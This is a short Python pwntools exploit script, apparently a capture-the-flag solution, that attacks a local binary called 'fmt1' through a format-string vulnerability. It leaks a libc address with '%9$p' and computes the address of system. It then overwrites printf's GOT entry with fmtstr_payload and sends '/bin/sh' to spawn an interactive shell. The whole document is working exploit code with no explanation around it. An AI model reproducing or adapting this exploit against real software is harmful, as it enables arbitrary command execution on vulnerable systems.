#!/usr/bin/python3
from pwn import *

context.arch='amd64'
context.log_level='debug'
e = ELF("./fmt1")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
io = process("./fmt1")
gdb.attach(io, 'b printf')
printf_got = e.got['printf']

payload = b'%9$p'

io.sendafter(b"Input: \n", payload)
lsm = int(io.recv(14),16)
libcbase = lsm - 0x2a1ca
system_addr = libcbase + libc.sym['system']


print(hex(lsm))

print(f'system {system_addr:#x}')
print(f'printf_got {printf_got:#x}')
payload = fmtstr_payload(6, {printf_got:system_addr})

io.sendafter(b"Input", payload)

io.sendafter(b"Input", b'/bin/sh\0')
io.interactive()